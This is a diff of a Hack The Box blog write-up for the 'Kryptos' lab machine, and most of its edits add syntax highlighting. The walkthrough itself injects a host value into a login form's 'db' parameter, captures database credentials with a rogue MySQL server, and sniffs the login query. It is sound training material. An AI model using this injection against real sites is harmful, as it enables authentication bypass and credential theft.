@@ -92,8 +92,8 @@
   <hr>
 
 <h2 id="quick-summary">Quick Summary</h2>
-<p><br>Hey guys today Kryptos retired and here’s my write-up about it. It’s one of the hardest boxes I’ve ever seen and it definitely taught me a lot. As you may have already guessed, it had a lot of cryptography stuff, it also had a long chain of web vulnerabilities, starting with authentication bypass and ending with SQL injection allowing arbitrary file write. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.129</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">kryptos.htb</code>. Let’s jump right in !<br>
-<img src="/images/hackthebox/kryptos/0.png" alt="">
+<p><br>Hey guys today Kryptos retired and here’s my write-up about it. It’s one of the hardest boxes I’ve ever seen and it definitely taught me a lot. As you may have already guessed, it had a lot of cryptography stuff, it also had a long chain of web vulnerabilities, starting with authentication bypass and ending with SQL injection allowing arbitrary file write. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.129</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">kryptos.htb</code>. Let’s jump right in !
+<br><img src="/images/hackthebox/kryptos/0.png" alt=""><br>
 <br></p>
 <hr>
 
@@ -118,7 +118,7 @@ Nmap done: 1 IP address (1 host up) scanned in 34.39 seconds
 <h2 id="initial-web-enumeration">Initial Web Enumeration</h2>
 <p><br><code class="highlighter-rouge">http://kryptos.htb</code> :
 <br>
-<img src="/images/hackthebox/kryptos/1.png" alt="">
+<br><img src="/images/hackthebox/kryptos/1.png" alt=""><br>
 <br>The index page is a login page titled <code class="highlighter-rouge">Cryptor Login</code>, I checked the directories with <code class="highlighter-rouge">gobuster</code> but the only interesting thing I got was a forbidden directory called <code class="highlighter-rouge">dev</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# gobuster -u http://kryptos.htb/ -w /usr/share/wordlists/dirb/common.txt -to 120s -t 100
 
@@ -145,88 +145,86 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 </code></pre></div></div>
 <p><br>I tested the login page with <code class="highlighter-rouge">test:test</code> and I intercepted the request with <code class="highlighter-rouge">burp</code>:
 <br>
-<img src="/images/hackthebox/kryptos/2.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/kryptos/3.png" alt="">
+<br><img src="/images/hackthebox/kryptos/2.png" alt=""><br>
+<br><img src="/images/hackthebox/kryptos/3.png" alt=""><br>
 <br>Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
-Host: kryptos.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://kryptos.htb/
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 116
-Cookie: PHPSESSID=99ub5git6oc7mka23ibjdorla2
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">116</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 username=test&amp;password=test&amp;db=cryptor&amp;token=fe47b3105c71089f25ea5342c41d7d9eb972b989c22db6c70b1f8d1f9c967ace&amp;login=
 </code></pre></div></div>
 <p><br>I noticed a parameter called <code class="highlighter-rouge">db</code>, I changed its value to <code class="highlighter-rouge">test</code> to see what will happen :
 <br>Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
-Host: kryptos.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://kryptos.htb/
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 113
-Cookie: PHPSESSID=99ub5git6oc7mka23ibjdorla2
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">113</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 username=test&amp;password=test&amp;db=test&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=
 </code></pre></div></div>
 <p><br>Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
-Date: Thu, 12 Sep 2019 19:57:27 GMT
-Server: Apache/2.4.29 (Ubuntu)
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-Content-Length: 23
-Connection: close
-Content-Type: text/html; charset=UTF-8
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 12 Sep 2019 19:57:27 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">23</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
 
 PDOException code: 1044
 </code></pre></div></div>
 <p><br>I got a <code class="highlighter-rouge">PDO</code> exception, I searched for <code class="highlighter-rouge">PDO</code> and found <a href="https://www.php.net/manual/en/book.pdo.php" target="_blank" rel="noopener noreferrer">this page</a>. I looked at the user contributed notes and saw this example :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
-$db = new PDO('dblib:host=your_hostname;dbname=your_db;charset=UTF-8', $user, $pass);
-?&gt;
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">'dblib:host=your_hostname;dbname=your_db;charset=UTF-8'</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 <p><br>I guessed that the POST parameter <code class="highlighter-rouge">db</code> is being used in a similar code and <code class="highlighter-rouge">dbname</code> gets its value from it, so I thought of injecting that parameter with <code class="highlighter-rouge">;host=10.10.xx.xx</code> and see If I can successfully change the host parameter.
 <br>Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
-Host: kryptos.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://kryptos.htb/
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 133
-Cookie: PHPSESSID=99ub5git6oc7mka23ibjdorla2
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">133</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 username=test&amp;password=test&amp;db=cryptor;host=10.10.xx.xx&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=
 </code></pre></div></div>
 <p><br>Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
-Date: Thu, 12 Sep 2019 20:01:29 GMT
-Server: Apache/2.4.29 (Ubuntu)
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-Content-Length: 23
-Connection: close
-Content-Type: text/html; charset=UTF-8
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 12 Sep 2019 20:01:29 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">23</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
 
 PDOException code: 2002
 </code></pre></div></div>
@@ -278,18 +276,18 @@ msf5 auxiliary(server/capture/mysql) &gt; run
 [*] Server started.
 </code></pre></div></div>
 <p><br>After running the module I sent this request again :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
-Host: kryptos.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://kryptos.htb/
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 133
-Cookie: PHPSESSID=99ub5git6oc7mka23ibjdorla2
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">133</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 username=test&amp;password=test&amp;db=cryptor;host=10.10.xx.xx&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=
 </code></pre></div></div>
@@ -314,45 +312,45 @@ Username : <code class="highlighter-rouge">dbuser</code>
 <br>
 Password : <code class="highlighter-rouge">krypt0n1te</code>
 <br> Now we need to create the database, create the database user <code class="highlighter-rouge">dbuser</code> and grant them permission to the database <code class="highlighter-rouge">cryptor</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# mysql
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MariaDB connection id is 38
-Server version: 10.3.14-MariaDB-1 Debian buildd-unstable
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">kryptos</span><span class="o">#</span> <span class="n">mysql</span>
+<span class="n">Welcome</span> <span class="k">to</span> <span class="n">the</span> <span class="n">MariaDB</span> <span class="n">monitor</span><span class="p">.</span>  <span class="n">Commands</span> <span class="k">end</span> <span class="k">with</span> <span class="p">;</span> <span class="k">or</span> <span class="err">\</span><span class="k">g</span><span class="p">.</span>
+<span class="n">Your</span> <span class="n">MariaDB</span> <span class="k">connection</span> <span class="n">id</span> <span class="k">is</span> <span class="mi">38</span>
+<span class="n">Server</span> <span class="k">version</span><span class="p">:</span> <span class="mi">10</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">14</span><span class="o">-</span><span class="n">MariaDB</span><span class="o">-</span><span class="mi">1</span> <span class="n">Debian</span> <span class="n">buildd</span><span class="o">-</span><span class="n">unstable</span>
 
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+<span class="n">Copyright</span> <span class="p">(</span><span class="k">c</span><span class="p">)</span> <span class="mi">2000</span><span class="p">,</span> <span class="mi">2018</span><span class="p">,</span> <span class="n">Oracle</span><span class="p">,</span> <span class="n">MariaDB</span> <span class="n">Corporation</span> <span class="n">Ab</span> <span class="k">and</span> <span class="n">others</span><span class="p">.</span>
 
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+<span class="k">Type</span> <span class="s1">'help;'</span> <span class="k">or</span> <span class="s1">'</span><span class="se">\h</span><span class="s1">'</span> <span class="k">for</span> <span class="n">help</span><span class="p">.</span> <span class="k">Type</span> <span class="s1">'</span><span class="se">\c</span><span class="s1">'</span> <span class="k">to</span> <span class="n">clear</span> <span class="n">the</span> <span class="k">current</span> <span class="k">input</span> <span class="k">statement</span><span class="p">.</span>
 
-MariaDB [(none)]&gt; show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| mysql              |
-| performance_schema |
-+--------------------+
-3 rows in set (0.002 sec)
+<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">--------------------+</span>
+<span class="o">|</span> <span class="k">Database</span>           <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------------------+</span>
+<span class="o">|</span> <span class="n">information_schema</span> <span class="o">|</span>
+<span class="o">|</span> <span class="n">mysql</span>              <span class="o">|</span>
+<span class="o">|</span> <span class="n">performance_schema</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------------------+</span>
+<span class="mi">3</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">002</span> <span class="n">sec</span><span class="p">)</span>
 
-MariaDB [(none)]&gt; create database cryptor;
-Query OK, 1 row affected (0.025 sec)
+<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">database</span> <span class="n">cryptor</span><span class="p">;</span>
+<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="k">row</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">025</span> <span class="n">sec</span><span class="p">)</span>
 
-MariaDB [(none)]&gt; show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| cryptor            |
-| information_schema |
-| mysql              |
-| performance_schema |
-+--------------------+
-4 rows in set (0.001 sec)
+<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">--------------------+</span>
+<span class="o">|</span> <span class="k">Database</span>           <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------------------+</span>
+<span class="o">|</span> <span class="n">cryptor</span>            <span class="o">|</span>
+<span class="o">|</span> <span class="n">information_schema</span> <span class="o">|</span>
+<span class="o">|</span> <span class="n">mysql</span>              <span class="o">|</span>
+<span class="o">|</span> <span class="n">performance_schema</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">--------------------+</span>
+<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>
 
-MariaDB [(none)]&gt; use cryptor;
-Database changed
-MariaDB [cryptor]&gt; grant all privileges on *.* to 'dbuser'@'%' identified by 'krypt0n1te';
-Query OK, 0 rows affected (0.133 sec)
+<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">cryptor</span><span class="p">;</span>
+<span class="k">Database</span> <span class="n">changed</span>
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">grant</span> <span class="k">all</span> <span class="k">privileges</span> <span class="k">on</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span> <span class="k">to</span> <span class="s1">'dbuser'</span><span class="o">@</span><span class="s1">'%'</span> <span class="n">identified</span> <span class="k">by</span> <span class="s1">'krypt0n1te'</span><span class="p">;</span>
+<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">133</span> <span class="n">sec</span><span class="p">)</span>
 
-MariaDB [cryptor]&gt; 
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> 
 </code></pre></div></div>
 <p><br>Let’s test it :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# mysql -u dbuser -p
@@ -388,32 +386,32 @@ tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      
 <h2 id="authentication-bypass-getting-login-query">Authentication Bypass: Getting Login Query</h2>
 <p><br>Now the server will be able to authenticate to the database as <code class="highlighter-rouge">dbuser</code>, however the login query will fail because the database is empty : 
 <br>Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
-Host: kryptos.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://kryptos.htb/
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 133
-Cookie: PHPSESSID=99ub5git6oc7mka23ibjdorla2
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">133</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 username=test&amp;password=test&amp;db=cryptor;host=10.10.xx.xx&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=
 </code></pre></div></div>
 <p><br>Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
-Date: Thu, 12 Sep 2019 20:29:54 GMT
-Server: Apache/2.4.29 (Ubuntu)
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-Vary: Accept-Encoding
-Content-Length: 966
-Connection: close
-Content-Type: text/html; charset=UTF-8
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 12 Sep 2019 20:29:54 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">966</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
 
 
 <span class="nt">&lt;html&gt;</span>
@@ -445,18 +443,18 @@ Content-Type: text/html; charset=UTF-8
 <span class="nt">&lt;/html&gt;</span>
 </code></pre></div></div>
 <p><br>I ran <code class="highlighter-rouge">tcpdump</code> on <code class="highlighter-rouge">tun0</code> then I sent the login request again with these credentials : <code class="highlighter-rouge">rick:rick</code></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
-Host: kryptos.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://kryptos.htb/
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 133
-Cookie: PHPSESSID=99ub5git6oc7mka23ibjdorla2
-Connection: close
-Upgrade-Insecure-Requests: 1
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">133</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
 
 username=rick&amp;password=rick&amp;db=cryptor;host=10.10.xx.xx&amp;token=04621e3945efee9172f45070c43020e6615cccc81d5cc3d69f5e6f93a53321e2&amp;login=
 </code></pre></div></div>
@@ -469,87 +467,85 @@ tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 root@kali:~/Desktop/HTB/boxes/kryptos# 
 </code></pre></div></div>
 <p><br>Then I opened the <code class="highlighter-rouge">pcap</code> file in <code class="highlighter-rouge">wireshark</code> and got the query :
-<img src="/images/hackthebox/kryptos/4.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT username, password FROM users WHERE username='rick' AND password='891f490e5d7bdb06d90d56f8d7db405f'
+<br><img src="/images/hackthebox/kryptos/4.png" alt=""><br></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'rick'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">'891f490e5d7bdb06d90d56f8d7db405f'</span>
 </code></pre></div></div>
 <p><br></p>
 <hr>
 
 <h2 id="authentication-bypass-setting-up-the-database">Authentication Bypass: Setting-up the Database</h2>
 <p><br>From the query now we know that we need to create a table called <code class="highlighter-rouge">users</code> with the columns <code class="highlighter-rouge">username</code> and <code class="highlighter-rouge">paassword</code>, we also know that the passwords are saved <code class="highlighter-rouge">md5</code> hashed as we saw for the password <code class="highlighter-rouge">rick</code> in the query :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt;&gt;&gt; from hashlib import md5
-&gt;&gt;&gt; print md5("rick").hexdigest()
-891f490e5d7bdb06d90d56f8d7db405f
-&gt;&gt;&gt;
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
